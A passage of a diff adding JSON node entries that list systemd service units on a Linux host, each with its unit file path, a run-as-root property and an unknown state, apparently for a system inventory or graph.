+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:snapd.autoimport.service",
+      "type": "service",
+      "label": "snapd.autoimport.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/snapd.autoimport.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:snapd.core-fixup.service",
+      "type": "service",
+      "label": "snapd.core-fixup.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/snapd.core-fixup.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:snapd.recovery-chooser-trigger.service",
+      "type": "service",
+      "label": "snapd.recovery-chooser-trigger.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/snapd.recovery-chooser-trigger.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:snapd.seeded.service",
+      "type": "service",
+      "label": "snapd.seeded.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/snapd.seeded.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:snapd.service",
+      "type": "service",
+      "label": "snapd.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/snapd.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:ssh.service",
+      "type": "service",
+      "label": "ssh.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/ssh.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-networkd.service",
+      "type": "service",
+      "label": "systemd-networkd.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/systemd-networkd.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-resolved.service",
+      "type": "service",
+      "label": "systemd-resolved.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/systemd-resolved.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:thermald.service",
+      "type": "service",
+      "label": "thermald.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/thermald.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:ua-reboot-cmds.service",
+      "type": "service",
+      "label": "ua-reboot-cmds.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/ua-reboot-cmds.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:vsftpd.service",
+      "type": "service",
+      "label": "vsftpd.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/vsftpd.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:multipath-tools.service",
+      "type": "service",
+      "label": "multipath-tools.service",
+      "properties": {
+        "path": "/etc/systemd/system/multipath-tools.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:networking.service",
+      "type": "service",
+      "label": "networking.service",
+      "properties": {
+        "path": "/etc/systemd/system/network-online.target.wants/networking.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-networkd-wait-online.service",
+      "type": "service",
+      "label": "systemd-networkd-wait-online.service",
+      "properties": {
+        "path": "/etc/systemd/system/network-online.target.wants/systemd-networkd-wait-online.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:vgauth.service",
+      "type": "service",
+      "label": "vgauth.service",
+      "properties": {
+        "path": "/etc/systemd/system/open-vm-tools.service.requires/vgauth.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:grub-initrd-fallback.service",
+      "type": "service",
+      "label": "grub-initrd-fallback.service",
+      "properties": {
+        "path": "/etc/systemd/system/rescue.target.wants/grub-initrd-fallback.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:sshd.service",
+      "type": "service",
+      "label": "sshd.service",
+      "properties": {
+        "path": "/etc/systemd/system/sshd.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:apparmor.service",
+      "type": "service",
+      "label": "apparmor.service",
+      "properties": {
+        "path": "/etc/systemd/system/sysinit.target.wants/apparmor.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:blk-availability.service",
+      "type": "service",
+      "label": "blk-availability.service",
+      "properties": {
+        "path": "/etc/systemd/system/sysinit.target.wants/blk-availability.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:finalrd.service",
+      "type": "service",
+      "label": "finalrd.service",
+      "properties": {
+        "path": "/etc/systemd/system/sysinit.target.wants/finalrd.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:keyboard-setup.service",
+      "type": "service",
+      "label": "keyboard-setup.service",
+      "properties": {
+        "path": "/etc/systemd/system/sysinit.target.wants/keyboard-setup.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:lvm2-monitor.service",
+      "type": "service",
+      "label": "lvm2-monitor.service",
+      "properties": {
+        "path": "/etc/systemd/system/sysinit.target.wants/lvm2-monitor.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:multipathd.service",
+      "type": "service",
+      "label": "multipathd.service",
+      "properties": {
+        "path": "/etc/systemd/system/sysinit.target.wants/multipathd.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:open-iscsi.service",
+      "type": "service",
+      "label": "open-iscsi.service",
+      "properties": {
+        "path": "/etc/systemd/system/sysinit.target.wants/open-iscsi.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:setvtrgb.service",
+      "type": "service",
+      "label": "setvtrgb.service",
+      "properties": {
+        "path": "/etc/systemd/system/sysinit.target.wants/setvtrgb.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-pstore.service",
+      "type": "service",
+      "label": "systemd-pstore.service",
+      "properties": {
+        "path": "/etc/systemd/system/sysinit.target.wants/systemd-pstore.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-timesyncd.service",
+      "type": "service",
+      "label": "systemd-timesyncd.service",
+      "properties": {
+        "path": "/etc/systemd/system/sysinit.target.wants/systemd-timesyncd.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:syslog.service",
+      "type": "service",
+      "label": "syslog.service",
+      "properties": {
+        "path": "/etc/systemd/system/syslog.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:vmtoolsd.service",
+      "type": "service",
+      "label": "vmtoolsd.service",
+      "properties": {
+        "path": "/etc/systemd/system/vmtoolsd.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:autovt@.service",
+      "type": "service",
+      "label": "autovt@.service",
+      "properties": {
+        "path": "/lib/systemd/system/autovt@.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:cryptdisks-early.service",
+      "type": "service",
+      "label": "cryptdisks-early.service",
+      "properties": {
+        "path": "/lib/systemd/system/cryptdisks-early.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:cryptdisks.service",
+      "type": "service",
+      "label": "cryptdisks.service",
+      "properties": {
+        "path": "/lib/systemd/system/cryptdisks.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:dbus-org.freedesktop.hostname1.service",
+      "type": "service",
+      "label": "dbus-org.freedesktop.hostname1.service",
+      "properties": {
+        "path": "/lib/systemd/system/dbus-org.freedesktop.hostname1.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:dbus-org.freedesktop.locale1.service",
+      "type": "service",
+      "label": "dbus-org.freedesktop.locale1.service",
+      "properties": {
+        "path": "/lib/systemd/system/dbus-org.freedesktop.locale1.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:dbus-org.freedesktop.login1.service",
+      "type": "service",
+      "label": "dbus-org.freedesktop.login1.service",
+      "properties": {
+        "path": "/lib/systemd/system/dbus-org.freedesktop.login1.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:dbus-org.freedesktop.timedate1.service",
+      "type": "service",
+      "label": "dbus-org.freedesktop.timedate1.service",
+      "properties": {
+        "path": "/lib/systemd/system/dbus-org.freedesktop.timedate1.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:getty-static.service",
+      "type": "service",
+      "label": "getty-static.service",
+      "properties": {
+        "path": "/lib/systemd/system/getty.target.wants/getty-static.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-update-utmp-runlevel.service",
+      "type": "service",
+      "label": "systemd-update-utmp-runlevel.service",
+      "properties": {
+        "path": "/lib/systemd/system/graphical.target.wants/systemd-update-utmp-runlevel.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-halt.service",
+      "type": "service",
+      "label": "plymouth-halt.service",
+      "properties": {
+        "path": "/lib/systemd/system/halt.target.wants/plymouth-halt.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:hwclock.service",
+      "type": "service",
+      "label": "hwclock.service",
+      "properties": {
+        "path": "/lib/systemd/system/hwclock.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-start.service",
+      "type": "service",
+      "label": "plymouth-start.service",
+      "properties": {
+        "path": "/lib/systemd/system/initrd-switch-root.target.wants/plymouth-start.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-switch-root.service",
+      "type": "service",
+      "label": "plymouth-switch-root.service",
+      "properties": {
+        "path": "/lib/systemd/system/initrd-switch-root.target.wants/plymouth-switch-root.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-kexec.service",
+      "type": "service",
+      "label": "plymouth-kexec.service",
+      "properties": {
+        "path": "/lib/systemd/system/kexec.target.wants/plymouth-kexec.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:kmod.service",
+      "type": "service",
+      "label": "kmod.service",
+      "properties": {
+        "path": "/lib/systemd/system/kmod.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:lvm2.service",
+      "type": "service",
+      "label": "lvm2.service",
+      "properties": {
+        "path": "/lib/systemd/system/lvm2.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:dbus.service",
+      "type": "service",
+      "label": "dbus.service",
+      "properties": {
+        "path": "/lib/systemd/system/multi-user.target.wants/dbus.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-quit-wait.service",
+      "type": "service",
+      "label": "plymouth-quit-wait.service",
+      "properties": {
+        "path": "/lib/systemd/system/multi-user.target.wants/plymouth-quit-wait.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-quit.service",
+      "type": "service",
+      "label": "plymouth-quit.service",
+      "properties": {
+        "path": "/lib/systemd/system/multi-user.target.wants/plymouth-quit.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-logind.service",
+      "type": "service",
+      "label": "systemd-logind.service",
+      "properties": {
+        "path": "/lib/systemd/system/multi-user.target.wants/systemd-logind.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-update-utmp-runlevel.service",
+      "type": "service",
+      "label": "systemd-update-utmp-runlevel.service",
+      "properties": {
+        "path": "/lib/systemd/system/multi-user.target.wants/systemd-update-utmp-runlevel.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-user-sessions.service",
+      "type": "service",
+      "label": "systemd-user-sessions.service",
+      "properties": {
+        "path": "/lib/systemd/system/multi-user.target.wants/systemd-user-sessions.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:multipath-tools-boot.service",
+      "type": "service",
+      "label": "multipath-tools-boot.service",
+      "properties": {
+        "path": "/lib/systemd/system/multipath-tools-boot.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:multipath-tools.service",
+      "type": "service",
+      "label": "multipath-tools.service",
+      "properties": {
+        "path": "/lib/systemd/system/multipath-tools.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-log.service",
+      "type": "service",
+      "label": "plymouth-log.service",
+      "properties": {
+        "path": "/lib/systemd/system/plymouth-log.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth.service",
+      "type": "service",
+      "label": "plymouth.service",
+      "properties": {
+        "path": "/lib/systemd/system/plymouth.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-poweroff.service",
+      "type": "service",
+      "label": "plymouth-poweroff.service",
+      "properties": {
+        "path": "/lib/systemd/system/poweroff.target.wants/plymouth-poweroff.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:procps.service",
+      "type": "service",
+      "label": "procps.service",
+      "properties": {
+        "path": "/lib/systemd/system/procps.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:rc.service",
+      "type": "service",
+      "label": "rc.service",
+      "properties": {
+        "path": "/lib/systemd/system/rc.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:rcS.service",
+      "type": "service",
+      "label": "rcS.service",
+      "properties": {
+        "path": "/lib/systemd/system/rcS.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-reboot.service",
+      "type": "service",
+      "label": "plymouth-reboot.service",
+      "properties": {
+        "path": "/lib/systemd/system/reboot.target.wants/plymouth-reboot.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-update-utmp-runlevel.service",
+      "type": "service",
+      "label": "systemd-update-utmp-runlevel.service",
+      "properties": {
+        "path": "/lib/systemd/system/rescue.target.wants/systemd-update-utmp-runlevel.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:screen-cleanup.service",
+      "type": "service",
+      "label": "screen-cleanup.service",
+      "properties": {
+        "path": "/lib/systemd/system/screen-cleanup.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:sudo.service",
+      "type": "service",
+      "label": "sudo.service",
+      "properties": {
+        "path": "/lib/systemd/system/sudo.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:kmod-static-nodes.service",
+      "type": "service",
+      "label": "kmod-static-nodes.service",
+      "properties": {
+        "path": "/lib/systemd/system/sysinit.target.wants/kmod-static-nodes.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-read-write.service",
+      "type": "service",
+      "label": "plymouth-read-write.service",
+      "properties": {
+        "path": "/lib/systemd/system/sysinit.target.wants/plymouth-read-write.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-start.service",
+      "type": "service",
+      "label": "plymouth-start.service",
+      "properties": {
+        "path": "/lib/systemd/system/sysinit.target.wants/plymouth-start.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-binfmt.service",
+      "type": "service",
+      "label": "systemd-binfmt.service",
+      "properties": {
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-binfmt.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-boot-system-token.service",
+      "type": "service",
+      "label": "systemd-boot-system-token.service",
+      "properties": {
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-boot-system-token.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-hwdb-update.service",
+      "type": "service",
+      "label": "systemd-hwdb-update.service",
+      "properties": {
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-hwdb-update.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-journal-flush.service",
+      "type": "service",
+      "label": "systemd-journal-flush.service",
+      "properties": {
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-journal-flush.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-journald.service",
+      "type": "service",
+      "label": "systemd-journald.service",
+      "properties": {
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-journald.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-machine-id-commit.service",
+      "type": "service",
+      "label": "systemd-machine-id-commit.service",
+      "properties": {
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-machine-id-commit.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-modules-load.service",
+      "type": "service",
+      "label": "systemd-modules-load.service",
+      "properties": {
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-modules-load.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-random-seed.service",
+      "type": "service",
+      "label": "systemd-random-seed.service",
+      "properties": {
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-random-seed.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-sysctl.service",
+      "type": "service",
+      "label": "systemd-sysctl.service",
+      "properties": {
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-sysctl.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-sysusers.service",
+      "type": "service",
+      "label": "systemd-sysusers.service",
+      "properties": {
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-sysusers.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-tmpfiles-setup-dev.service",
+      "type": "service",
+      "label": "systemd-tmpfiles-setup-dev.service",
+      "properties": {
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-tmpfiles-setup-dev.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-tmpfiles-setup.service",
+      "type": "service",
+      "label": "systemd-tmpfiles-setup.service",
+      "properties": {
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-tmpfiles-setup.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-udev-trigger.service",
+      "type": "service",
+      "label": "systemd-udev-trigger.service",
+      "properties": {
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-udev-trigger.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-udevd.service",
+      "type": "service",
+      "label": "systemd-udevd.service",
+      "properties": {
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-udevd.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-update-utmp.service",
+      "type": "service",
+      "label": "systemd-update-utmp.service",
+      "properties": {
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-update-utmp.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:fwupd-offline-update.service",
+      "type": "service",
+      "label": "fwupd-offline-update.service",
+      "properties": {
+        "path": "/lib/systemd/system/system-update.target.wants/fwupd-offline-update.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:packagekit-offline-update.service",
+      "type": "service",
+      "label": "packagekit-offline-update.service",
+      "properties": {
+        "path": "/lib/systemd/system/system-update.target.wants/packagekit-offline-update.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:udev.service",
+      "type": "service",
+      "label": "udev.service",
+      "properties": {
+        "path": "/lib/systemd/system/udev.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:x11-common.service",
+      "type": "service",
+      "label": "x11-common.service",
+      "properties": {
+        "path": "/lib/systemd/system/x11-common.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:autovt@.service",
+      "type": "service",
+      "label": "autovt@.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/autovt@.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:cryptdisks-early.service",
+      "type": "service",
+      "label": "cryptdisks-early.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/cryptdisks-early.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:cryptdisks.service",
+      "type": "service",
+      "label": "cryptdisks.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/cryptdisks.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:dbus-org.freedesktop.hostname1.service",
+      "type": "service",
+      "label": "dbus-org.freedesktop.hostname1.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/dbus-org.freedesktop.hostname1.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:dbus-org.freedesktop.locale1.service",
+      "type": "service",
+      "label": "dbus-org.freedesktop.locale1.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/dbus-org.freedesktop.locale1.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:dbus-org.freedesktop.login1.service",
+      "type": "service",
+      "label": "dbus-org.freedesktop.login1.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/dbus-org.freedesktop.login1.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:dbus-org.freedesktop.timedate1.service",
+      "type": "service",
+      "label": "dbus-org.freedesktop.timedate1.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/dbus-org.freedesktop.timedate1.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:getty-static.service",
+      "type": "service",
+      "label": "getty-static.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/getty.target.wants/getty-static.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-update-utmp-runlevel.service",
+      "type": "service",
+      "label": "systemd-update-utmp-runlevel.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/graphical.target.wants/systemd-update-utmp-runlevel.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-halt.service",
+      "type": "service",
+      "label": "plymouth-halt.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/halt.target.wants/plymouth-halt.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:hwclock.service",
+      "type": "service",
+      "label": "hwclock.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/hwclock.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-start.service",
+      "type": "service",
+      "label": "plymouth-start.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/initrd-switch-root.target.wants/plymouth-start.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-switch-root.service",
+      "type": "service",
+      "label": "plymouth-switch-root.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/initrd-switch-root.target.wants/plymouth-switch-root.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-kexec.service",
+      "type": "service",
+      "label": "plymouth-kexec.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/kexec.target.wants/plymouth-kexec.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:kmod.service",
+      "type": "service",
+      "label": "kmod.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/kmod.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:lvm2.service",
+      "type": "service",
+      "label": "lvm2.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/lvm2.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:dbus.service",
+      "type": "service",
+      "label": "dbus.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/multi-user.target.wants/dbus.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-quit-wait.service",
+      "type": "service",
+      "label": "plymouth-quit-wait.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/multi-user.target.wants/plymouth-quit-wait.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-quit.service",
+      "type": "service",
+      "label": "plymouth-quit.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/multi-user.target.wants/plymouth-quit.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-logind.service",
+      "type": "service",
+      "label": "systemd-logind.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/multi-user.target.wants/systemd-logind.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-update-utmp-runlevel.service",
+      "type": "service",
+      "label": "systemd-update-utmp-runlevel.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/multi-user.target.wants/systemd-update-utmp-runlevel.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-user-sessions.service",
+      "type": "service",
+      "label": "systemd-user-sessions.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/multi-user.target.wants/systemd-user-sessions.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:multipath-tools-boot.service",
+      "type": "service",
+      "label": "multipath-tools-boot.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/multipath-tools-boot.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:multipath-tools.service",
+      "type": "service",
+      "label": "multipath-tools.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/multipath-tools.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-log.service",
+      "type": "service",
+      "label": "plymouth-log.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/plymouth-log.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth.service",
+      "type": "service",
+      "label": "plymouth.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/plymouth.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-poweroff.service",
+      "type": "service",
+      "label": "plymouth-poweroff.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/poweroff.target.wants/plymouth-poweroff.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:procps.service",
+      "type": "service",
+      "label": "procps.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/procps.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:rc.service",
+      "type": "service",
+      "label": "rc.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/rc.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:rcS.service",
+      "type": "service",
+      "label": "rcS.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/rcS.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-reboot.service",
+      "type": "service",
+      "label": "plymouth-reboot.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/reboot.target.wants/plymouth-reboot.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-update-utmp-runlevel.service",
+      "type": "service",
+      "label": "systemd-update-utmp-runlevel.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/rescue.target.wants/systemd-update-utmp-runlevel.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:screen-cleanup.service",
+      "type": "service",
+      "label": "screen-cleanup.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/screen-cleanup.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:sudo.service",
+      "type": "service",
+      "label": "sudo.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/sudo.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:kmod-static-nodes.service",
+      "type": "service",
+      "label": "kmod-static-nodes.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/kmod-static-nodes.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-read-write.service",
+      "type": "service",
+      "label": "plymouth-read-write.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/plymouth-read-write.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:plymouth-start.service",
+      "type": "service",
+      "label": "plymouth-start.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/plymouth-start.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
